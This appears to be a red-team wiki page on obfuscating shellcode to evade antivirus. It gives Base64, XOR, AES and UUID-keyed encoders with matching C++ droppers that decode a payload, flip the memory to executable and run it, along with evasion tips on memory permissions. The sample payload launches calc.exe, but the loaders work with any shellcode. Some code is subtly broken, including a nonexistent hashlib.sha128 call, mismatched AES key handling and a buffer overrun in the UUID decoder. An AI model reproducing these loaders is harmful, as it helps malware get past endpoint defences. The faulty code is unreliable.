# ðŸ”§ Shellcode Encoding & Encryption

## <mark style="color:red;">Intro</mark>

One of the most common ways to hide IoCs is to encrypt / encode our shellcode inside the loader and decrypt / decode it at runtime. this will evade static analysis (except for entropy analysis which is discussed in the next section), but the IoCs might get flagged in dynamic analysis phase on the sandbox or in behavioral analysis phase by interval memory scanners.

**Encoding and encrypion should be used in combination with oher evasion techniques to be more effective.**

### <mark style="color:orange;">**Encoding**</mark>

<mark style="color:green;">**Pros:**</mark>

* Lower entropy
* Faster&#x20;
* Easy to implement, no need to use win32 APIs or any other 3rd party library

<mark style="color:red;">**Cons:**</mark>

* Easy to detect and deobfuscate for security products and malware analysts

### <mark style="color:orange;">Encryption</mark>

<mark style="color:green;">**Pros:**</mark>

* Hard to detect and deobfuscate

<mark style="color:red;">**Cons:**</mark>

* Higher entropy
* Slower
* Hard to implement special without using any win32 API

{% hint style="info" %}
**The most used encryption algorithms in malware are XOR and RC4.**
{% endhint %}

***

## <mark style="color:red;">Base64 Encoding</mark>

A well known encoding algorithm, not really suitable for shellcode obfuscation as its pretty simple to decode. to generate a base64 encoded shellcode, simply cat the file and pipe it to base64 command in linux:

```bash
$ cat calc.bin | base64 

/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHB
yQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHW
TTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFY
QVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//V
u/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA
```

the C++ dropper looks like this:

<pre class="language-cpp" data-title="b64-dropper.cpp"><code class="lang-cpp"><strong>
</strong>#include &#x3C;windows.h>
#include &#x3C;stdio.h>
#include &#x3C;stdlib.h>
#include &#x3C;string.h>
#include &#x3C;Wincrypt.h>
#pragma comment (lib, "Crypt32.lib")

unsigned char calc_payload[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
unsigned int calc_len = sizeof(calc_payload);


int DecodeBase64( const BYTE * src, unsigned int srcLen, char * dst, unsigned int dstLen ) {

	DWORD outLen;
	BOOL fRet;

	outLen = dstLen;
	fRet = CryptStringToBinary( (LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE * )dst, &#x26;outLen, NULL, NULL);
	
	if (!fRet) outLen = 0;  // failed
	
	return( outLen );
}


int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	
	// Allocate new memory buffer for payload
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Decode the payload back to binary form
	DecodeBase64((const BYTE *)calc_payload, calc_len, (char *) exec_mem, calc_len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &#x26;oldprotect);


	// If all good, execute!
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
</code></pre>

```
// @ECHO OFF
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcb64-dropper.cpp /link /OUT:b64-dropper.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```

***

## <mark style="color:red;">XOR Encryption</mark>

This is a simple python script that reads a binary file and XORs the output shellcode with a custom key:

{% code title="xor.py" %}
```python
import sys

KEY = "secret-key"

def xor(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

try:
    with open(sys.argv[1], "rb") as f:
        plaintext = f.read()
except:
    print("Usage: %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = xor(plaintext, KEY.encode())
print('{ 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')
```
{% endcode %}

executing the script will give us an array of encrypted shellcode, we place it in the C++ dropper and compile the file:

{% code title="xor-dropper.cpp" %}
```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	unsigned char calc_payload[] = { 0x91, 0x31, 0xf0, 0x81, 0x93, 0x9a, 0xa5, 0x74, 0x6b, 0x65, 0x24, 0x34, 0x2c, 0x29, 0x21, 0x34, 0x35, 0x3a, 0x54, 0xa6, 0xe, 0x2d, 0xee, 0x37, 0xd, 0x31, 0xf8, 0x37, 0x7b, 0x3a, 0xee, 0x26, 0x4b, 0x2d, 0xee, 0x17, 0x3d, 0x31, 0x7c, 0xd2, 0x29, 0x38, 0x28, 0x45, 0xa2, 0x2d, 0x54, 0xa5, 0xc1, 0x45, 0x12, 0x19, 0x61, 0x5e, 0x45, 0x35, 0xaa, 0xac, 0x68, 0x24, 0x6c, 0xb8, 0x91, 0x88, 0x31, 0x33, 0x34, 0x3c, 0xe0, 0x37, 0x45, 0xee, 0x2f, 0x45, 0x3b, 0x64, 0xb3, 0xf9, 0xe5, 0xfc, 0x6b, 0x65, 0x65, 0x2d, 0xe8, 0xb9, 0x7, 0x2, 0x2b, 0x73, 0xb5, 0x24, 0xe0, 0x2d, 0x7d, 0x21, 0xe6, 0x39, 0x53, 0x2c, 0x62, 0xa2, 0x86, 0x22, 0x23, 0x9a, 0xac, 0x24, 0xe6, 0x4d, 0xfb, 0x2d, 0x62, 0xa4, 0x28, 0x45, 0xa2, 0x2d, 0x54, 0xa5, 0xc1, 0x38, 0xb2, 0xac, 0x6e, 0x33, 0x64, 0xb5, 0x53, 0x85, 0x10, 0x94, 0x21, 0x7a, 0x3f, 0x41, 0x6b, 0x37, 0x5c, 0xa5, 0x1e, 0xbd, 0x3d, 0x21, 0xe6, 0x39, 0x57, 0x2c, 0x62, 0xa2, 0x3, 0x35, 0xe0, 0x69, 0x2d, 0x21, 0xe6, 0x39, 0x6f, 0x2c, 0x62, 0xa2, 0x24, 0xff, 0x6f, 0xed, 0x2d, 0x64, 0xbd, 0x38, 0x2b, 0x24, 0x3b, 0x2c, 0x3c, 0x2e, 0x2a, 0x3d, 0x24, 0x3c, 0x2c, 0x23, 0x3b, 0xe6, 0x8f, 0x52, 0x24, 0x26, 0x94, 0x85, 0x3d, 0x24, 0x34, 0x23, 0x3b, 0xee, 0x71, 0x9b, 0x32, 0x8b, 0x94, 0x9a, 0x38, 0x2d, 0xd7, 0x78, 0x73, 0x65, 0x63, 0x72, 0x65, 0x74, 0x6b, 0x2d, 0xe8, 0xe8, 0x6c, 0x78, 0x73, 0x65, 0x22, 0xc8, 0x54, 0xff, 0x4, 0xe2, 0x9a, 0xb0, 0xd6, 0x89, 0xc6, 0xc7, 0x35, 0x33, 0xdf, 0xd2, 0xfe, 0xd8, 0xf8, 0x9a, 0xb8, 0x31, 0xf0, 0xa1, 0x4b, 0x4e, 0x63, 0x8, 0x61, 0xe5, 0x9e, 0x85, 0x18, 0x7c, 0xc8, 0x22, 0x70, 0x0, 0xa, 0x1e, 0x6b, 0x3c, 0x24, 0xec, 0xb7, 0x86, 0xa6, 0x6, 0x2, 0x1e, 0x6, 0x5a, 0xe, 0x1d, 0x0, 0x65 };
	unsigned int calc_len = sizeof(calc_payload);
	char key[] = "secret-key";

	// Allocate a buffer for payload (READ/WRITE memory permissions)
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Decrypt (DeXOR) the payload
	XOR((char *) calc_payload, calc_len, key, sizeof(key));
	
	// Copy the payload to allocated buffer
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	
	// flip memory permissions to READ/EXECUTE
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	// If all good, launch the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
```
{% endcode %}

{% hint style="info" %}
The reason we allocate the memory with read/write permission and flipping it after copying the shellcode is that setting read/write/execute permission on a memory buffer is rarely used and is consider malicious by security products. so setting read/write and then changing it to read/execute is the more evasive approach.
{% endhint %}

***

## <mark style="color:red;">AES Encryption</mark>

Implementing AES is harder compared to XOR. the entropy is also very high and its not recommended.



{% code title="aes-crypter.py" %}
```python
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import hashlib

KEY = os.urandom(16)

def pad(s):
    block_size = algorithms.AES.block_size // 8
    padding_size = block_size - len(s) % block_size
    padding = bytes([padding_size]) * padding_size
    return s + padding

def aesenc(plaintext, key):
    k = hashlib.sha128(key).digest()
    iv = bytes(16)
    plaintext = pad(plaintext)
    backend = default_backend()
    cipher = Cipher(algorithms.AES(k), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    return encryptor.update(plaintext) + encryptor.finalize()

try:
    with open(sys.argv[1], "rb") as f:
        plaintext = f.read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = aesenc(plaintext, KEY)
print('AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
print('payload[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')

```
{% endcode %}

the C++ dropper:

{% code title="aes-dropper.cpp" %}
```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	char key[] = {0xf3, 0x1e, 0x49, 0x2e, 0x6f, 0xd9, 0xd2, 0x66, 0x3b, 0x52, 0xd2, 0xb8, 0xbb, 0xbd, 0x53, 0xb0};
	unsigned char calc_payload[] = {0xde, 0x96, 0x3c, 0x6a, 0xcc, 0xa6, 0x47, 0x44, 0xee, 0x1f, 0x4f, 0x12, 0xe0, 0x5, 0xcf, 0x89, 0xd1, 0xc9, 0xd2, 0x58, 0xc0, 0x4c, 0xa0, 0x1a, 0x59, 0x40, 0x15, 0xfa, 0xfa, 0xef, 0x67, 0x5, 0xd0, 0x48, 0x25, 0xae, 0xda, 0xd3, 0xa3, 0x56, 0x8, 0x11, 0x93, 0xeb, 0x91, 0x91, 0x2f, 0xd9, 0xf2, 0xd7, 0xe2, 0x7f, 0x4f, 0x30, 0x29, 0x5d, 0x3, 0x4a, 0x16, 0xe0, 0xf3, 0x8a, 0xd1, 0x72, 0x5e, 0xa0, 0x9, 0x6f, 0x8c, 0xfc, 0xdf, 0x3b, 0x3d, 0xc9, 0xc3, 0xb7, 0xe2, 0x96, 0xb0, 0x48, 0x84, 0x13, 0x87, 0x22, 0xa9, 0xb2, 0x32, 0xf9, 0xda, 0xe4, 0xad, 0xb1, 0x41, 0x66, 0x5c, 0x2b, 0x86, 0x4d, 0x87, 0x64, 0x52, 0x76, 0x24, 0x26, 0xae, 0xf4, 0x3, 0x46, 0xa6, 0xed, 0x80, 0xc2, 0x8b, 0x1c, 0xac, 0x6, 0x55, 0x2c, 0xad, 0xe6, 0xbd, 0xa5, 0x6, 0x1c, 0x56, 0x3, 0xf2, 0xf3, 0xaa, 0xf8, 0xbe, 0xe8, 0xa8, 0x95, 0x8b, 0x7d, 0x1a, 0x58, 0x3b, 0x28, 0x96, 0x8f, 0xb4, 0x21, 0x6f, 0xc6, 0x16, 0x73, 0x44, 0x40, 0xee, 0xe3, 0x6c, 0x10, 0xb3, 0xc7, 0xb1, 0xf1, 0x63, 0x3f, 0x98, 0x6e, 0x43, 0x29, 0x3a, 0xe2, 0x33, 0xa7, 0x6f, 0xed, 0x14, 0x79, 0xb1, 0x62, 0xa7, 0x9, 0xec, 0x66, 0xe4, 0x3e, 0xea, 0x45, 0xf5, 0x7d, 0x38, 0x36, 0x35, 0xbd, 0xa8, 0x37, 0xe0, 0x31, 0xfe, 0x5f, 0xdc, 0x8a, 0xa7, 0x61, 0x34, 0xcf, 0x4b, 0xa1, 0x3a, 0x67, 0xc0, 0x88, 0x77, 0x67, 0xba, 0x5, 0x68, 0xaa, 0xfa, 0xc3, 0xb7, 0xfc, 0xa0, 0xfd, 0xca, 0x9, 0x46, 0xcb, 0x93, 0x42, 0xbf, 0x7f, 0x14, 0xb4, 0xa2, 0x40, 0x81, 0x2, 0xd9, 0x4a, 0x25, 0xec, 0xe3, 0x72, 0xbb, 0x3a, 0x8e, 0x55, 0xc0, 0x7d, 0xf4, 0x5d, 0x10, 0x90, 0x5d, 0xc, 0x58, 0x22, 0xa, 0x68, 0x96, 0xae, 0x88, 0xe8, 0xa5, 0xe0, 0x54, 0x36, 0x31, 0x2, 0x23, 0x46, 0x2e, 0xd5, 0x9f, 0x52, 0x97, 0x13, 0x55, 0x79, 0xaa, 0x2a, 0x78, 0xd3, 0xe4, 0xc4, 0x93, 0x55, 0x57, 0x5d, 0xd1, 0x2, 0x79, 0xae};
	unsigned int calc_len = sizeof(calc_payload);
	
	// Allocate memory for payload
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);


	// Decrypt payload
	AESDecrypt((char *) calc_payload, calc_len, key, sizeof(key));
	
	// Copy payload to allocated buffer
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);


	// If all good, launch the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
```
{% endcode %}

***

## <mark style="color:red;">UUID Encoding</mark>

UUID encoding has several variants, each with its own algorithm for generating the identifier. The most commonly used variant is Version 4, which uses random numbers to generate the UUID. Other variants include Version 1, which uses a combination of timestamp and network identifiers, and Version 5, which uses a hashing algorithm to generate the UUID based on a namespace and a name.

Overall, UUID encoding is a widely used method for generating unique identifiers that are suitable for use in distributed systems, as they can be generated independently by different systems without risk of collision.

this python script converts a binary file to a UUID encoded string with a random key:

{% code title="bin2uuid.py" %}
```python
import uuid

def custom_encode(data, key):
    encoded_data = bytearray()
    for i in range(len(data)):
        encoded_data.append(data[i] ^ ord(key[i % len(key)]))
    return encoded_data

def main():
    # Load binary data from a file
    with open('calc.bin', 'rb') as f:
        binary_data = bytearray(f.read())

    # Generate a UUID as the key
    key = str(uuid.uuid4())

    encoded_data = custom_encode(binary_data, key)

    # Print the encoded content
    for byte in encoded_data:
        print('{:02X}'.format(byte), end='')
    print()

    # Print the encoding key
    print("\nEncoding Key:")
    print(key)

if __name__ == '__main__':
    main()

```
{% endcode %}

```bash
> python bin2uuid.py
9870B1D3C4DDF4312D317560747D666267781CEA5C79E97F5078EA67287BB96B137DB91634703D807E7F7900E47905F19911554F331C0D79F8F86F6C31F183D862726371B86712EF26047A36E4BEB4B92D313479B0ED40547931FD68B2797A69BB70417C31E3D16F7BCAFB25EF0CBA7F35E37900E47905F1996CF5FA3C712CF901D117DC7C332D1138760BE846ED6A20EF78167E35E55270A63D7C75BE6D287A30E06CB33DB92A2CE0713974686D6B63726D733D25627AB4D8157563D2D16C706C777CB823D97AC7C6CE3F658A31613530333239337DBFE965393237758F05BA42B6CBE48EDD81916771979EAC8CFFD2E578E2F1180F344539B5C984113D897027475B5B2D6875B8EFD2E150505C4E165C49072D

Encoding Key:
d8274541-1415-4310-891b-00a50329352d
```

and this C++ shellcode runner executes decrypts and executes the shellcode:

{% code title="uuid.cpp" %}
```cpp
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

// Custom decode function based on XOR
void custom_decode(uint8_t *data, size_t data_len, const char *key) {
    size_t key_len = strlen(key);
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

int main() {
    // Replace this with your encoded shellcode
    const char *encoded_shellcode = "9870B1D3C4DDF4312D317560747D666267781CEA5C79E97F5078EA67287BB96B137DB91634703D807E7F7900E47905F19911554F331C0D79F8F86F6C31F183D862726371B86712EF26047A36E4BEB4B92D313479B0ED40547931FD68B2797A69BB70417C31E3D16F7BCAFB25EF0CBA7F35E37900E47905F1996CF5FA3C712CF901D117DC7C332D1138760BE846ED6A20EF78167E35E55270A63D7C75BE6D287A30E06CB33DB92A2CE0713974686D6B63726D733D25627AB4D8157563D2D16C706C777CB823D97AC7C6CE3F658A31613530333239337DBFE965393237758F05BA42B6CBE48EDD81916771979EAC8CFFD2E578E2F1180F344539B5C984113D897027475B5B2D6875B8EFD2E150505C4E165C49072D"; // Encoded shellcode here

    // Replace this with the key used for encoding
    const char *key = "d8274541-1415-4310-891b-00a50329352d";

    size_t encoded_len = strlen(encoded_shellcode);
    uint8_t *decoded_shellcode = (uint8_t *)malloc(encoded_len);
    if (!decoded_shellcode) {
        printf("Memory allocation failed.\n");
        return 1;
    }

    // Convert encoded shellcode to bytes
    for (size_t i = 0; i < encoded_len; i++) {
        sscanf(encoded_shellcode + 2 * i, "%2hhx", &decoded_shellcode[i]);
    }

    // Decode the shellcode
    custom_decode(decoded_shellcode, encoded_len, key);

    // Allocate executable memory
    void *exec_mem = VirtualAlloc(0, encoded_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {
        printf("Failed to allocate memory.\n");
        free(decoded_shellcode);
        return 1;
    }

    // Copy decoded shellcode to allocated memory
    memcpy(exec_mem, decoded_shellcode, encoded_len);

    // Execute the shellcode
    ((void(*)())exec_mem)();

    // Cleanup
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    free(decoded_shellcode);

    return 0;
}
```
{% endcode %}
